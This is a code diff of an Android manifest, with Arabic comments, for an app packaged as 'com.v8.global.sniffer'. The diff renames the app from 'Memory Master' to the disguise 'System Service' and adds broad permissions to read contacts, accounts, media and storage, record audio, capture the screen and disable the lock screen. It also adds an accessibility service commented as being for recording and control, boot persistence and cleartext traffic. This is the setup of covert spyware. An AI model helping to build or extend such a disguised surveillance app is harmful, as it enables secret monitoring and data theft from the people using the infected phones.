@@ -2,25 +2,43 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.v8.global.sniffer">
 
-    <!-- الأذونات الأساسية -->
+    <!-- أذونات الإنترنت والتشغيل الدائم -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    
+    <!-- أذونات الملفات والتخزين (Android 13+) -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    
+    <!-- أذونات جهات الاتصال والحسابات -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.READ_PROFILE" />
+    
+    <!-- أذونات الخدمات الخاصة -->
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    
+    <!-- التحكم بالشاشة -->
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
 
     <application
-        android:label="Memory Master"
+        android:label="System Service"
         android:theme="@style/Theme.AppCompat.Translucent"
         android:allowBackup="true"
         android:persistent="true"
-        android:hardwareAccelerated="true">
+        android:hardwareAccelerated="true"
+        android:usesCleartextTraffic="true">
 
         <activity android:name=".MainActivity" 
             android:exported="true"
@@ -33,8 +51,9 @@
             </intent-filter>
         </activity>
 
+        <!-- خدمة الإشعارات -->
         <service android:name=".NotificationService"
-            android:label="System Sync Service"
+            android:label="System Service"
             android:foregroundServiceType="specialUse"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true"
@@ -45,8 +64,9 @@
             </intent-filter>
         </service>
 
-        <service android:name=".MyAccessibilityService"
-            android:label="System Security"
+        <!-- خدمة الوصول (للتسجيل والتحكم) -->
+        <service android:name=".RecordingAccessibilityService"
+            android:label="System Access"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
             android:stopWithTask="false"
@@ -58,22 +78,14 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- مستقبل بدء التشغيل -->
         <receiver android:name=".BootReceiver" 
             android:exported="true"
-            android:enabled="true"
-            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <category android:name="android.intent.category.DEFAULT" />
-            </intent-filter>
-        </receiver>
-        
-        <receiver android:name=".RestartReceiver" 
-            android:exported="true"
-            android:enabled="true">
-            <intent-filter>
-                <action android:name="RESTART_SERVICE" />
             </intent-filter>
         </receiver>
 
